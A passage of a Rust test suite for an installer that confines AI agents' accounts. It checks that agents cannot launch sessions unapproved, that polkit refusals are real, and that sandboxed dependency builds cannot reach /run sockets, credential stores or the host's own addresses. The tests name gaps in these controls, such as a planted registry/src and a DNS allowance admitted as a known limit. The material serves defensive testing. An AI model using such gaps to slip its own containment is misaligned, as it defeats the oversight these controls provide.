    let source = m.source.to_string_lossy().to_string();
    let args = [
        "--machine",
        MACHINE,
        "--commit",
        &commit,
        "--source",
        &source,
        "--dry-run",
    ];
    let both = [
        ("AGENT_SIGN_SITTING_ROOT", root.as_str()),
        ("AGENT_SIGN_SITTING_GIT", git.as_str()),
    ];
    let cases: Vec<(&str, Vec<(&str, &str)>)> = vec![
        ("root and git, no flag", both.to_vec()),
        (
            "root and git, flag 0",
            [&both[..], &[("AGENT_SIGN_SITTING_TEST", "0")][..]].concat(),
        ),
        (
            "root and git, flag empty",
            [&both[..], &[("AGENT_SIGN_SITTING_TEST", "")][..]].concat(),
        ),
        ("only the root, no flag", vec![both[0]]),
        ("only git, no flag", vec![both[1]]),
    ];
    let mut problems: Vec<String> = Vec::new();
    for (what, env) in cases {
        let before = m.snap();
        let n = m.sudo_log().len();
        let run = m.run_env(&args, PREFIX, &[], &env);
        let t = run.text();
        if run.code == 0 || !t.lines().any(|l| l.trim_start().starts_with("Stopped:")) {
            problems.push(format!(
                "{what}: not refused with a plain Stopped line (exit {})",
                run.code
            ));
        } else if !t.contains("AGENT_SIGN_SITTING") {
            problems.push(format!("{what}: the message doesn't name the variable"));
        }
        if m.sudo_log().len() != n {
            problems.push(format!("{what}: the script used sudo before refusing"));
        }
        let d = diff(&before, &m.snap());
        if !d.is_empty() {
            problems.push(format!("{what}: the machine changed: {d:?}"));
        }
    }
    assert!(
        problems.is_empty(),
        "A-9: {} problem(s):\n{}",
        problems.len(),
        problems.join("\n")
    );
    must_succeed(&m.sitting(&["--dry-run"]), "the same dry run with the flag");
}

// ---------------------------------------------------------------- A-10 (LOW)

/// A-10, part 1: `system.toml` makes one-account launch refused from then on, so it is
/// installed only once the service has answered: when the service never becomes healthy
/// the run stops and no `/etc/agent-sign/system.toml` is left. (Waits for the script's own
/// 30-second health wait.)
///
/// Fails today: `system.toml` is installed before the service is started.
#[test]
fn a10_no_system_toml_is_left_when_the_service_never_becomes_healthy() {
    let m = Machine::new();
    fs::write(m.log.join("unhealthy"), "").unwrap();
    let run = m.sitting(&[]);
    assert!(
        !m.exists("etc/agent-sign/system.toml"),
        "A-10: system.toml was installed although the service never reported healthy"
    );
    must_stop_plainly(
        &run,
        "the service never becomes healthy",
        &["agent-signd", "healthy", "service", "ping"],
    );
}

/// A-10, part 1, the order: in a good run the first call that places `system.toml` comes
/// after the first call of the installed `agent-sign` that checks the service.
///
/// Fails today: it is placed in step 8, before the service starts in step 9.
#[test]
fn a10_system_toml_is_placed_only_after_the_service_has_answered() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let dest = m
        .path("etc/agent-sign/system.toml")
        .to_string_lossy()
        .to_string();
    let calls = m.calls();
    let placed = calls
        .iter()
        .find(|c| {
            c.name == "sudo-cmd" && {
                let t: Vec<&str> = c.args.split_whitespace().collect();
                t.len() >= 3
                    && ["install", "mv", "cp", "tee"].contains(&t[1])
                    && t.last() == Some(&dest.as_str())
            }
        })
        .expect("a root call that places system.toml");
    let healthy = calls
        .iter()
        .find(|c| c.name == "program" && c.args.contains("bin/agent-sign "))
        .expect("the health check");
    assert!(
        placed.seq > healthy.seq,
        "A-10: system.toml was placed (call {}) before the service answered (call {})",
        placed.seq,
        healthy.seq
    );
}

/// A-10, part 2: `--slots 1` cannot pass the real end checks (the probe session holds the
/// only slot, so no second session can start), and under a test root nothing shows that a
/// design that "passes" does. So this test requires the other choice the finding allowed:
/// `--slots 1` is refused before any change, with a plain message that says why. If the
/// builder prefers to make one slot work, the orchestrator must say how that is observable
/// here and replace this test.
///
/// Fails today: `--slots 1` is accepted.
#[test]
fn a10_slots_1_is_refused_before_any_change() {
    for extra in [&["--slots", "1"][..], &["--slots", "1", "--dry-run"][..]] {
        let m = Machine::new();
        let before = m.snap();
        let run = m.sitting(extra);
        must_refuse_before_any_change(&m, &run, &before, &format!("{extra:?}"), &["slots", "slot"]);
    }
}

// ---------------------------------------------------------------- A-11 (Info)

/// A-11: `--undo` restores the agents' files from the copies made at the first run, so
/// it overwrites changes the agents made after, and can put a link over a file they
/// replaced. Either the undo keeps those later changes, or it SAYS so plainly. This test
/// passes if both a later line in `~/.gitconfig` and a later regular file in the bin folder
/// survive the undo, or if the output of the undo states that later changes are
/// overwritten or replaced.
///
/// Fails today: both are lost and the output says nothing.
#[test]
fn a11_undo_either_keeps_later_changes_or_says_it_overwrites_them() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let gc = m.path("home/agents/.gitconfig");
    let mut text = fs::read_to_string(&gc).unwrap();
    text.push_str("[core]\n\teditor = later-editor\n");
    fs::write(&gc, text).unwrap();
    let bin = m.path("home/agents/.agent-sign/bin/agent-git");
    fs::remove_file(&bin).unwrap();
    fs::write(&bin, "#!/bin/sh\n# later work\n").unwrap();

    let undo = m.sitting(&["--undo"]);
    let t = undo.text().to_lowercase();
    let kept_config = m
        .read("home/agents/.gitconfig")
        .is_some_and(|c| c.contains("later-editor"));
    let kept_file = m
        .read("home/agents/.agent-sign/bin/agent-git")
        .is_some_and(|c| c.contains("later work"));
    let says = (t.contains("later") || t.contains("since") || t.contains("after the sitting"))
        && (t.contains("overwrit")
            || t.contains("replac")
            || t.contains("discard")
            || t.contains("lost"));
    assert!(
        (kept_config && kept_file) || says,
        "A-11: undo lost later changes (kept git config: {kept_config}, kept file: {kept_file}) and does not say it overwrites them\n{}",
        undo.text()
    );
}

// ---------------------------------------------------------------- B-1, agent-sign's side

/// B-1, I-B1: `--login-pending` is accepted only together with `--dry-run`. Alone, or with
/// `--undo`, it is refused with a plain message that names it, before any change.
///
/// Fails today: "unknown argument" (the message names the argument but does not say
/// it needs `--dry-run`).
#[test]
fn b1_login_pending_is_accepted_only_with_dry_run() {
    for extra in [&["--login-pending"][..], &["--login-pending", "--undo"][..]] {
        let m = Machine::new();
        let before = m.snap();
        let run = m.sitting(extra);
        must_refuse_before_any_change(
            &m,
            &run,
            &before,
            &format!("{extra:?}"),
            &["dry-run", "dry run"],
        );
        assert!(
            run.text().contains("--login-pending"),
            "the message should name --login-pending\n{}",
            run.text()
        );
    }
}

/// B-1, I-B1: with the login not yet delivered and the SSH engine not yet there
/// (agentic-credentials' logins sitting hasn't run), `--dry-run --login-pending` passes:
/// it lists the steps that need them as "after the login is delivered" instead of failing,
/// still lists the other steps' `would:` lines, and changes nothing. An OpenBao that is
/// sealed or older than 2.7.2 is still refused with the flag.
///
/// Fails today: "unknown argument --login-pending".
#[test]
fn b1_a_dry_run_with_login_pending_passes_before_the_login_and_the_ssh_engine_are_delivered() {
    let m = Machine::new();
    fs::remove_file(m.path(DELIVERED_LOGIN)).unwrap();
    m.set("CA_RAW", "");
    let before = m.snap();
    let run = m.sitting(&["--dry-run", "--login-pending"]);
    must_succeed(&run, "dry run with the login pending");
    assert!(
        run.stdout.contains("after the login is delivered"),
        "the steps that need the login should be listed as \"after the login is delivered\"\n{}",
        run.stdout
    );
    let would = run
        .stdout
        .lines()
        .filter(|l| l.trim_start().starts_with("would:"))
        .count();
    assert!(
        would >= 5,
        "the other steps should still be listed ({would} would: lines)\n{}",
        run.stdout
    );
    let d = diff(&before, &m.snap());
    assert!(d.is_empty(), "the dry run changed the machine: {d:?}");
    assert!(m.mutations().is_empty(), "{:?}", m.mutations());

    // Guards that must not be weakened by the flag.
    let m = Machine::new();
    fs::remove_file(m.path(DELIVERED_LOGIN)).unwrap();
    m.set("BAO_SEALED", "1");
    let run = m.sitting(&["--dry-run", "--login-pending"]);
    must_stop_plainly(
        &run,
        "sealed OpenBao with --login-pending",
        &["sealed", "unseal"],
    );
    let m = Machine::new();
    fs::remove_file(m.path(DELIVERED_LOGIN)).unwrap();
    m.set("BAO_VERSION", "2.7.1");
    let run = m.sitting(&["--dry-run", "--login-pending"]);
    must_stop_plainly(&run, "OpenBao 2.7.1 with --login-pending", &["2.7.2"]);
}

// ================================================================ round 2 of the review fixes (S1 to S8)
//
// Written BEFORE the round-2 fixes, by an agent other than their builder, against the
// round-1 worktree. S1 to S6 each have tests that fail for the named reason where the
// finding is a defect today; a few are regression guards and say so. S7 (clippy) is a
// lint-only change to older tests, labelled "S7" where it was made, with no assertion
// changed. S8 (docs) and the wording parts of S4 need no test.

// ---------------------------------------------------------------- S1: the end checks, run for real

/// The text of the named shell functions of the sitting (script and `lib.sh`), ready to be
/// sourced by a test harness. Panics if one is missing, so a rename is loud.
fn shell_fn_text(names: &[&str]) -> String {
    let funcs = shell_functions(&sitting_sources());
    let mut out = String::new();
    for n in names {
        let (name, body) = funcs
            .iter()
            .find(|(f, _)| f == n)
            .unwrap_or_else(|| panic!("the sitting has no shell function {n}"));
        out.push_str(&format!("{name}() {{\n{}\n}}\n", body.join("\n")));
    }
    out
}

/// A throwaway folder of stand-ins (`pkcheck`, `systemd-run`, the installed `agent-sign`) in
/// which the sitting's real end-check functions run, with `as_user` reduced to "run the
/// command here" (no sudo, no other account). Nothing touches the machine they run on.
struct EndCheckEnv {
    _t: TempDir,
    bin: PathBuf,
}

impl EndCheckEnv {
    fn new() -> EndCheckEnv {
        let t = tempdir().unwrap();
        let bin = t.path().join("bin");
        fs::create_dir_all(&bin).unwrap();
        let e = EndCheckEnv { _t: t, bin };
        // pkcheck: `correct` allows exactly what polkit's rule allows (the launcher starting a
        // session unit, stopping an end unit) and refuses everything else; a number is the exit
        // status for every question (0 yes, 1 no, 2 would ask, 126/127 errors).
        e.stub(
            "pkcheck",
            "unit=''; verb=''\n\
             while [ $# -gt 0 ]; do case \"$1\" in\n\
               --detail) case \"$2\" in unit) unit=$3 ;; verb) verb=$3 ;; esac; shift 3 ;;\n\
               *) shift ;;\n\
             esac; done\n\
             mode=$(cat \"$(dirname \"$0\")/pk-mode\")\n\
             case \"$mode\" in\n\
               correct) case \"$unit $verb\" in\n\
                 \"agent-session@1.service start\"|\"agent-session-end@1.service stop\") exit 0 ;;\n\
                 *) exit 1 ;; esac ;;\n\
               *) exit \"$mode\" ;;\n\
             esac\n",
        );
        e.pk("correct");
        e.launcher("", 0);
        e.systemd_run("Failed to start transient service unit: Access denied", 1);
        e
    }

    fn stub(&self, name: &str, body: &str) {
        let p = self.bin.join(name);
        fs::write(&p, format!("#!/bin/sh\n{body}")).unwrap();
        fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
    }

    /// What polkit answers: "correct", or the exit status pkcheck gives to every question.
    fn pk(&self, mode: &str) {
        fs::write(self.bin.join("pk-mode"), mode).unwrap();
    }

    /// The installed `agent-sign` (`$CURRENT_BIN/agent-sign`): prints `out` and exits `rc`.
    fn launcher(&self, out: &str, rc: i32) {
        fs::write(self.bin.join("agent-sign-out"), out).unwrap();
        self.stub(
            "agent-sign",
            &format!("cat \"$(dirname \"$0\")/agent-sign-out\"\nexit {rc}\n"),
        );
    }

    fn systemd_run(&self, out: &str, rc: i32) {
        fs::write(self.bin.join("systemd-run-out"), out).unwrap();
        self.stub(
            "systemd-run",
            &format!("cat \"$(dirname \"$0\")/systemd-run-out\"\nexit {rc}\n"),
        );
    }

    /// Whether `call` (shell) succeeds, with the named functions of the sitting loaded.
    /// `as_user_fails` makes the stand-in for sudo fail with no output at all.
    fn succeeds(&self, funcs: &[&str], call: &str, as_user_fails: bool) -> bool {
        let bin = self.bin.display();
        let script = format!(
            "set -u\nexport PATH='{bin}:/usr/bin:/bin'\nBIN='{bin}'\nCURRENT_BIN='{bin}'\nSLOTS=8\n\
             TRUST_REAL=/nonexistent/allowed_signers\n\
             as_user() {{\n  [ {fails} = 1 ] && return 1\n  shift 2\n  local c=(\"$@\") b\n\
               b=${{c[0]##*/}}\n  case ${{c[0]}} in /*) [ -x \"$BIN/$b\" ] && c[0]=$BIN/$b ;; esac\n  \"${{c[@]}}\"\n}}\n\
             {fns}\nif {call}; then echo YES; else echo NO; fi\n",
            fails = u8::from(as_user_fails),
            fns = shell_fn_text(funcs),
        );
        let f = self.bin.join("harness.sh");
        fs::write(&f, script).unwrap();
        let out = Command::new("bash")
            .arg(&f)
            .env_clear()
            .env("PATH", format!("{}:/usr/bin:/bin", self.bin.display()))
            .output()
            .expect("start bash");
        let so = String::from_utf8_lossy(&out.stdout).trim().to_string();
        match so.as_str() {
            "YES" => true,
            "NO" => false,
            other => panic!(
                "the harness for {call} printed {other:?}; stderr: {}",
                String::from_utf8_lossy(&out.stderr)
            ),
        }
    }
}

const POLKIT_FNS: [&str; 3] = ["polkit_status", "polkit_allows", "polkit_refuses"];

/// S1 / A-7, `agents_cant_launch`. It counted the word "refused" anywhere in the output as
/// the launcher's refusal of the agents' account, so a launcher that is DOWN ("Connection
/// refused") made the end check PASS. Required: only the launcher's own refusal of that
/// account counts (its text names the account as not a person's, or a launch approval
/// refused); a dead socket, a missing socket, a permission error, a launch that ran, or a
/// refusal text with exit 0 never do.
///
/// Runs the sitting's real function with a stand-in `agent-sign`.
///
/// Fails today: "Connection refused" (and the lower-case variant) count as a pass.
#[test]
fn s1_agents_cant_launch_counts_only_the_launchers_own_refusal() {
    let launcher_refusal = "agent-sign: uid 1001 isn't a person's account ([launcher] people_accounts), so it may launch only with a signed launch approval, and it sent none; no key may sign one on this machine yet ([launcher] approvers is empty)";
    let approval_refusal = "agent-sign: launch approval refused: no key may sign launch approvals on this machine yet ([launcher] approvers is empty), so only a person's account may launch";
    let cases: [(&str, &str, i32, bool); 11] = [
        (
            "the launcher refuses the account (its own text)",
            launcher_refusal,
            1,
            true,
        ),
        (
            "the launcher refuses the approval",
            approval_refusal,
            1,
            true,
        ),
        (
            "the launcher is down: Connection refused",
            "agent-sign: could not reach the launcher at /run/agent-sign/launcher.sock: Connection refused (os error 111)",
            1,
            false,
        ),
        (
            "connection refused, lower case",
            "connect: connection refused",
            1,
            false,
        ),
        (
            "the socket is missing",
            "agent-sign: connect /run/agent-sign/launcher.sock: No such file or directory (os error 2)",
            1,
            false,
        ),
        (
            "permission denied on the socket",
            "agent-sign: Permission denied (os error 13)",
            1,
            false,
        ),
        (
            "the launch went through and printed probe",
            "probe",
            0,
            false,
        ),
        ("the launch printed probe, then failed", "probe", 1, false),
        ("the refusal text but exit 0", launcher_refusal, 0, false),
        ("no output, exit 1", "", 1, false),
        (
            "the word refused in some other error",
            "agent-sign: refused to start: out of memory",
            1,
            false,
        ),
    ];
    let mut bad = Vec::new();
    for (what, out, rc, want) in cases {
        let e = EndCheckEnv::new();
        e.launcher(out, rc);
        let got = e.succeeds(&["agents_cant_launch"], "agents_cant_launch", false);
        if got != want {
            bad.push(format!("{what}: end check says {got}, want {want}"));
        }
    }
    assert!(
        bad.is_empty(),
        "S1: agents_cant_launch is wrong in {} case(s):\n{}",
        bad.len(),
        bad.join("\n")
    );
}

/// S1 / A-7, `polkit_refuses` and `polkit_allows`, with pkcheck's real exit statuses (man
/// pkcheck: 0 authorized, 1 not authorized, 2 not authorized because it would need
/// interaction, 126 malformed options, 127 an error). "Refuses" must hold only for 1 and 2;
/// an error status, a missing pkcheck, or a sudo that fails is neither a yes nor a no.
///
/// Runs the sitting's real functions. Round 1 already did this; this is the test that
/// proves it as shipped (it passes today and must keep passing).
#[test]
fn s1_polkit_refuses_only_for_pkchecks_not_authorized_statuses() {
    let mut bad = Vec::new();
    for (status, refuses, allows) in [
        ("0", false, true),
        ("1", true, false),
        ("2", true, false),
        ("126", false, false),
        ("127", false, false),
        ("255", false, false),
        ("4", false, false),
    ] {
        let e = EndCheckEnv::new();
        e.pk(status);
        let r = e.succeeds(
            &POLKIT_FNS,
            "polkit_refuses agents agent-signd.service restart",
            false,
        );
        let a = e.succeeds(
            &POLKIT_FNS,
            "polkit_allows agents agent-signd.service restart",
            false,
        );
        if r != refuses || a != allows {
            bad.push(format!(
                "pkcheck status {status}: refuses={r} (want {refuses}), allows={a} (want {allows})"
            ));
        }
    }
    // pkcheck missing (the shell says 127), and sudo itself failing (no answer at all).
    let e = EndCheckEnv::new();
    fs::remove_file(e.bin.join("pkcheck")).unwrap();
    if e.succeeds(
        &POLKIT_FNS,
        "polkit_refuses agents agent-signd.service restart",
        false,
    ) || e.succeeds(
        &POLKIT_FNS,
        "polkit_allows agents agent-signd.service restart",
        false,
    ) {
        bad.push("pkcheck missing counted as an answer".into());
    }
    let e = EndCheckEnv::new();
    e.pk("1");
    if e.succeeds(
        &POLKIT_FNS,
        "polkit_refuses agents agent-signd.service restart",
        true,
    ) {
        bad.push("a failing sudo counted as polkit refusing".into());
    }
    assert!(bad.is_empty(), "S1: {}", bad.join("\n"));
}

/// S1, the positive control: the launcher's limits end check (`launcher_limits_ok`) is true
/// only for a polkit that allows exactly what the rule allows. A polkit that refuses
/// everything (so every "refuses" check passes) must FAIL it because the allowed actions are
/// not YES; one that allows everything fails it; "Connection refused" from systemd-run is
/// not polkit's refusal of the transient unit; a transient unit that was started fails it.
///
/// Passes today (round 1 added the controls); proves them as shipped.
#[test]
fn s1_the_launcher_limits_check_needs_the_allowed_actions_to_be_yes() {
    let fns = [
        "polkit_status",
        "polkit_allows",
        "polkit_refuses",
        "transient_refused",
        "launcher_limits_ok",
    ];
    let denied = "Failed to start transient service unit: Access denied";
    let mut bad = Vec::new();
    for (what, pk, sr_out, sr_rc, want) in [
        ("the right policy", "correct", denied, 1, true),
        ("polkit refuses everything", "1", denied, 1, false),
        ("polkit allows everything", "0", denied, 1, false),
        (
            "systemd-run cannot reach the bus (Connection refused)",
            "correct",
            "Failed to connect to system bus: Connection refused",
            1,
            false,
        ),
        (
            "the transient unit as root was started",
            "correct",
            "",
            0,
            false,
        ),
    ] {
        let e = EndCheckEnv::new();
        e.pk(pk);
        e.systemd_run(sr_out, sr_rc);
        let got = e.succeeds(&fns, "launcher_limits_ok", false);
        if got != want {
            bad.push(format!("{what}: launcher_limits_ok is {got}, want {want}"));
        }
    }
    assert!(bad.is_empty(), "S1: {}", bad.join("\n"));
}

// ---------------------------------------------------------------- S2: the rollback, as shipped

/// S2, a first run. The installed `agent-sign` starts (`--version` works) but its service
/// health check fails (`doctor` says `ping: failed`), so the run gets as far as placing
/// `system.toml` and starting the units, then must ROLL BACK: no `/etc/agent-sign/system.toml`
/// is left (one-account launch must keep working), the units it started are stopped and
/// disabled, and the stop is plain. The old "unhealthy" stand-in failed `--version` too, so
/// the run stopped before the rollback could run.
///
/// Waits for the script's own 30-second health wait. The stand-in's `doctor`-only failure is
/// `<log>/unhealthy-doctor`.
///
/// Fails today only if the rollback does not reach (it is a coverage test); it is mutation
/// checked by removing `DIE_CLEANUP=rollback_settings`.
#[test]
fn s2_a_healthy_start_that_fails_its_health_check_rolls_back_system_toml_and_the_units() {
    let m = Machine::new();
    fs::write(m.log.join("unhealthy-doctor"), "").unwrap();
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "the service starts but is never healthy",
        &["agent-signd", "healthy", "service", "ping"],
    );
    assert!(
        run.text().contains("Rolling back"),
        "S2: the rollback did not run (it must say so):\n{}",
        run.text()
    );
    assert!(
        m.mutations()
            .iter()
            .any(|l| l.contains("install") && l.contains("system.toml")),
        "S2: system.toml was never placed, so this run did not reach the rollback: {:?}",
        m.mutations()
    );
    assert!(
        !m.exists("etc/agent-sign/system.toml"),
        "S2: system.toml was left after the service never became healthy"
    );
    for u in [
        "agent-signd.service",
        "agent-signd.socket",
        "agent-signd-launcher.socket",
    ] {
        let s = m.unit("system", u);
        assert!(
            !s.active && !s.enabled,
            "S2: {u} is still running or enabled after the rollback"
        );
    }
}

/// S2, a rerun. An earlier `system.toml` (8 slots) is there; the rerun asks for 9 slots, so
/// it places a changed `system.toml`, the service never becomes healthy, and the rollback
/// must put the EARLIER file back byte for byte (not remove it, not leave the new one).
///
/// Waits for the script's own 30-second health wait.
#[test]
fn s2_a_rerun_that_fails_its_health_check_restores_the_earlier_system_toml_byte_for_byte() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the first run");
    let before = fs::read(m.path("etc/agent-sign/system.toml")).expect("system.toml after run 1");
    fs::write(m.log.join("unhealthy-doctor"), "").unwrap();
    let run = m.sitting(&["--slots", "9"]);
    must_stop_plainly(
        &run,
        "the rerun's service is never healthy",
        &["agent-signd", "healthy", "service", "ping"],
    );
    assert!(
        run.text().contains("Rolling back"),
        "S2: the rollback did not run:\n{}",
        run.text()
    );
    let after = fs::read(m.path("etc/agent-sign/system.toml"))
        .expect("S2: the earlier system.toml is gone after the rollback");
    assert_eq!(
        before, after,
        "S2: the rollback did not restore the earlier system.toml byte for byte"
    );
    let left: Vec<String> = fs::read_dir(m.path("etc/agent-sign"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .filter(|n| n.contains("system.toml") && n != "system.toml")
        .collect();
    assert!(
        left.is_empty(),
        "S2: leftovers beside system.toml: {left:?}"
    );
}

// ---------------------------------------------------------------- S3 / S4: what the build can reach

/// Whether `path` is hidden from the unit: it, or a parent folder (never `/`), is an
/// `InaccessiblePaths` entry or a `TemporaryFileSystem` (tmpfs over it).
fn hidden_from_unit(call: &[String], path: &str) -> bool {
    let covers = |entry: &str| {
        let e = entry
            .trim_start_matches(['-', '+', '!'])
            .split(':')
            .next()
            .unwrap_or("");
        e != "/"
            && !e.is_empty()
            && (e == path || path.starts_with(&format!("{}/", e.trim_end_matches('/'))))
    };
    props(call, "InaccessiblePaths")
        .iter()
        .chain(props(call, "TemporaryFileSystem").iter())
        .any(|v| covers(v))
}

/// The two build calls: (fetch = the one with IPAddressDeny, compile = the one with PrivateNetwork).
fn fetch_and_compile(m: &Machine) -> (Vec<String>, Vec<String>) {
    let calls = systemd_run_calls(m);
    let fetch = calls
        .iter()
        .find(|c| !props(c, "IPAddressDeny").is_empty())
        .expect("the fetch phase (IPAddressDeny)")
        .clone();
    let compile = calls
        .iter()
        .find(|c| props(c, "PrivateNetwork").iter().any(|v| v == "yes"))
        .expect("the compile phase (PrivateNetwork=yes)")
        .clone();
    (fetch, compile)
}

/// S3. The compile phase is where hostile build scripts and proc-macros run. It has no IP
/// network (`PrivateNetwork=yes`) but it kept the host's `/run`: the system D-Bus, the
/// agent-sign and launcher sockets and any other unix-socket service are reachable through
/// the filesystem, and an IP filter does not see them. Required: `/run` is hidden in the
/// compile phase (no path under it is bound back), and so is every other host-local place
/// the build does not need (the credential stores, agent-sign's and the launcher's state,
/// the slots, the sitting's own settings), in both phases. An `InaccessiblePaths` entry
/// must start with `-` so a folder that does not exist on a machine (for example
/// `/etc/credstore`) does not stop the unit.
///
/// Static: reads the recorded `systemd-run` arguments.
///
/// Fails today: the compile phase has no `TemporaryFileSystem=/run`, and neither phase
/// hides the others.
#[test]
fn s3_the_compile_phase_hides_run_and_the_hosts_local_state_in_both_phases() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let (fetch, compile) = fetch_and_compile(&m);
    let mut bad = Vec::new();
    if !hidden_from_unit(&compile, "/run") {
        bad.push("compile: /run is not hidden (no TemporaryFileSystem=/run)".to_string());
    }
    for b in props(&compile, "BindReadOnlyPaths")
        .into_iter()
        .chain(props(&compile, "BindPaths"))
    {
        if b.trim_start_matches(['-', '+']).starts_with("/run") {
            bad.push(format!("compile: binds {b} back from /run"));
        }
    }
    for (phase, call) in [("fetch", &fetch), ("compile", &compile)] {
        for p in [
            "/etc/credstore.encrypted",
            "/etc/credstore",
            "/etc/agent-sign",
            "/var/lib/agent-sign",
            "/var/lib/agent-launch",
            "/var/lib/agent-launch-io",
            "/var/lib/agent-slots",
        ] {
            if !hidden_from_unit(call, p) {
                bad.push(format!("{phase}: {p} stays reachable (not under InaccessiblePaths or a TemporaryFileSystem)"));
            }
        }
        for v in props(call, "InaccessiblePaths") {
            if !v.starts_with('-') {
                bad.push(format!(
                    "{phase}: InaccessiblePaths={v} lacks the leading '-', so a machine without that folder cannot start the build"
                ));
            }
        }
    }
    assert!(
        bad.is_empty(),
        "S3: {} problem(s):\n{}",
        bad.len(),
        bad.join("\n")
    );
}

/// Stand-in for `ip`: answers `ip -j addr` (JSON), `ip -o addr` (one line per address) and
/// `ip -br addr` with a host that has one global IPv4 and one global IPv6 address.
fn write_ip_stub(m: &Machine) {
    let json = r#"[{"ifindex":1,"ifname":"lo","addr_info":[{"family":"inet","local":"127.0.0.1","prefixlen":8,"scope":"host","label":"lo"},{"family":"inet6","local":"::1","prefixlen":128,"scope":"host"}]},{"ifindex":2,"ifname":"eth0","addr_info":[{"family":"inet","local":"203.0.113.7","prefixlen":32,"scope":"global","label":"eth0"},{"family":"inet6","local":"2001:db8::7","prefixlen":64,"scope":"global"},{"family":"inet6","local":"fe80::1","prefixlen":64,"scope":"link"}]}]"#;
    let text = "1: lo    inet 127.0.0.1/8 scope host lo\\       valid_lft forever\n1: lo    inet6 ::1/128 scope host \\       valid_lft forever\n2: eth0    inet 203.0.113.7/32 scope global eth0\\       valid_lft forever\n2: eth0    inet6 2001:db8::7/64 scope global \\       valid_lft forever\n2: eth0    inet6 fe80::1/64 scope link \\       valid_lft forever\n";
    let brief = "lo               UNKNOWN        127.0.0.1/8 ::1/128\neth0             UP             203.0.113.7/32 2001:db8::7/64 fe80::1/64\n";
    let p = m.stubs.join("ip");
    fs::write(
        &p,
        format!(
            "#!/bin/sh\ncase \" $* \" in\n\
             *\" -j \"*|*\" -json \"*) cat <<'EOF'\n{json}\nEOF\n;;\n\
             *\" -br \"*|*\" -brief \"*) cat <<'EOF'\n{brief}EOF\n;;\n\
             *) cat <<'EOF'\n{text}EOF\n;;\nesac\n"
        ),
    )
    .unwrap();
    fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
}

/// S4, the host's own addresses. The fetch filter is a list of address RANGES (loopback,
/// private, link-local, Tailscale, metadata), not "this machine's addresses": a service
/// listening on the host's own PUBLIC address was reachable from the fetch. Required: the
/// host's own global addresses, read at sitting time (`ip`; the stand-in reports 203.0.113.7
/// and 2001:db8::7), are denied too, while ordinary public addresses stay open and the
/// allowance stays exactly the resolvers.
///
/// Fails today: the deny list is ranges only.
#[test]
fn s4_the_fetch_phase_also_denies_the_hosts_own_global_addresses() {
    let m = Machine::new();
    write_ip_stub(&m);
    must_succeed(&m.sitting(&[]), "the run");
    let (fetch, _) = fetch_and_compile(&m);
    let deny: Vec<Cidr> = props(&fetch, "IPAddressDeny")
        .iter()
        .flat_map(|v| expand_ranges(v))
        .collect();
    for own in ["203.0.113.7", "2001:db8::7"] {
        assert!(
            deny.iter().any(|d| covers(d, &cidr(own))),
            "S4: the host's own global address {own} is not denied in the fetch phase (IPAddressDeny={:?})",
            props(&fetch, "IPAddressDeny")
        );
    }
    for public in [
        "1.1.1.1",
        "151.101.1.1",
        "13.224.0.1",
        "2606:4700:4700::1111",
    ] {
        assert!(
            !deny.iter().any(|d| covers(d, &cidr(public))),
            "S4: the fetch phase denies the public address {public}, which it needs"
        );
    }
    let allow = props(&fetch, "IPAddressAllow");
    assert_eq!(
        allow,
        vec!["127.0.0.53".to_string()],
        "S4: the allowance must stay exactly the resolver"
    );
}

/// S4, the wording of the preflight line. It said the fetch phase may reach "no address of
/// this machine or of a private network", which the filter does not do (it denies address
/// ranges). The `ok:` line must say ranges and must not claim "no address of this machine".
///
/// Fails today: the line says "no address of this machine".
#[test]
fn s4_the_preflight_line_describes_address_ranges_not_this_machines_addresses() {
    let m = Machine::new();
    let run = m.sitting(&["--dry-run"]);
    must_succeed(&run, "the dry run");
    let line = run
        .stdout
        .lines()
        .find(|l| l.contains("ok:") && l.to_lowercase().contains("fetch"))
        .unwrap_or_else(|| panic!("no `ok:` line about the fetch phase:\n{}", run.stdout));
    let low = line.to_lowercase();
    assert!(
        !low.contains("no address of this machine"),
        "S4: the line still claims a filter by this machine's addresses: {line}"
    );
    assert!(
        low.contains("range"),
        "S4: the line should say the filter is address ranges: {line}"
    );
}

/// S4, the known limit (the suite PM's note), said plainly in the script's comments and in
/// the sitting README's backlog. Wording only, so loose: the script must name the DNS
/// allowance as a known limit, port 53 and `SocketBindAllow` (which restricts bind(2), not
/// connect, so it cannot narrow this), Tailscale's 100.100.100.100; the README must name the
/// next step (resolve before the fetch, then an /etc/hosts and no resolver).
///
/// Fails today: none of it is said.
#[test]
fn s4_the_dns_allowance_is_stated_as_a_known_limit_with_its_next_step() {
    let script = fs::read_to_string(script_path()).unwrap().to_lowercase();
    for needle in ["known limit", "port 53", "100.100.100.100", "socketbind"] {
        assert!(
            script.contains(needle),
            "S4: the script's comments never say {needle:?} (the DNS allowance as a known limit)"
        );
    }
    let readme = fs::read_to_string(sitting_dir().join("README.md"))
        .unwrap()
        .to_lowercase();
    assert!(
        readme.contains("/etc/hosts") && readme.contains("backlog"),
        "S4: README.md does not name the backlog idea (resolve first, give the fetch an /etc/hosts and no resolver)"
    );
}

// ---------------------------------------------------------------- S5: the compile phase trusts no extracted crate

/// S5. The compile phase re-checks every `.crate` against Cargo.lock, but it also took the
/// `registry/src` folders the fetch phase had extracted, and cargo trusts an extracted
/// folder it finds. A hostile fetch phase can plant a changed source there and keep the
/// right `.crate`. Required: the compile phase builds from the checked `.crate` files (and
/// the index) and extracts them itself: cargo must find NO `registry/src` content from the
/// fetch phase, and no `config.toml` either.
///
/// Runs the real `build-in-sandbox.sh compile` in a throwaway folder (the script's fixed
/// work folder is swapped for it), with a stand-in toolchain whose `cargo build` records
/// what it found.
///
/// Fails today: cargo finds `PLANTED-BY-THE-FETCH-PHASE` in `registry/src`.
#[test]
fn s5_the_compile_phase_extracts_the_crates_itself_and_trusts_no_registry_src() {
    let t = tempdir().unwrap();
    let top = t.path();
    let work = top.join("work");
    let logd = top.join("log");
    for d in [&work, &logd] {
        fs::create_dir_all(d).unwrap();
    }
    let script = fs::read_to_string(sitting_dir().join("files/build-in-sandbox.sh"))
        .expect("files/build-in-sandbox.sh");
    assert!(
